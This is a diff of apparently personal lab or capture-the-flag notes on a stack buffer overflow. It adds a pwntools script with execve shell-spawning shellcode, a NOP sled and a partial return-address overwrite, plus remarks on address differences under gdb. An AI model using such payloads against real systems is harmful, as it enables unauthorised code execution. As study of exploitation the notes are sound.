@@ -135,4 +135,25 @@ I now have to go through and re-find all of the memory addresses and offsets :/
 
 After changing some env variables, and running with absolute paths as well as setting .gdbinit stuff i still get different memory addreses.
 
-Brute foricing the way through till be land in the shell code is a pain in the ass.
+The fix i had is to invoke the binary with absolute paths.
+
+```python
+import sys
+from pwn import *
+
+shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+
+# build the payload - with a small nop sled
+payload = b"\x90" * 30
+payload += shellcode
+payload += b"A" * (126 - len(payload))
+# overwrite RIP byte
+payload += b"\xa0"
+
+sys.stdout.buffer.write(payload)
+```
+
+![](_attachments/Pasted%20image%2020230402120351.png)
+
+I'd still like a guide on fixing the env properly so it works within gdb and without.
+
